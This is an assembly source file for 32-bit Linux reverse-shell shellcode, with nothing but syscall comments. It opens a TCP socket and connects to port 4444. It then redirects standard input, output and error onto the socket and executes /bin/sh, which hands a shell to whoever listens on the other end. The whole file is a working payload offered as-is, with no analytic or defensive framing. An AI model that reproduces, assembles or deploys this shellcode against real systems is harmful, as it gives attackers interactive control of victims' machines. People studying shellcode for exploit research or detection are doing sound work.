global _start

section .text

_start:

;socket(AF_INET, SOCK_STREAM, 0);
        xor eax,eax
        xor ebx,ebx
        mov bl,0x1
        push eax
        push ebx
        push 0x2
        mov ecx,esp
        mov al,0x66
        int 0x80
        mov edx,eax
;connect(sockfd, (struct sockaddr *)&servSA_sin_family, sizeof servSA);
        xor eax,eax
        push eax
        push eax
        push eax
        push word 0x5c11
        inc bl
        push word bx
        mov esi,esp
        push 0x10
        push esi
        push edx
        mov ecx,esp
        mov al,0x66
        inc bl
        int 0x80

;dup2(sockfd,0)
        xor eax,eax
        xor ecx,ecx
        mov al,0x3f
        mov ebx, edx
        int 0x80

        xor eax,eax
        mov al,0x3f
        inc cl
        int 0x80

        xor eax,eax
        mov al,0x3f
        inc cl
        int 0x80

        xor eax,eax
        push eax
        push 0x68732f2f
    push 0x6e69622f
        mov esi,esp
        push eax
        push esi
    mov al,0xb
    mov ebx,esi
    mov ecx,esp
        xor edx,edx
    int 0x80
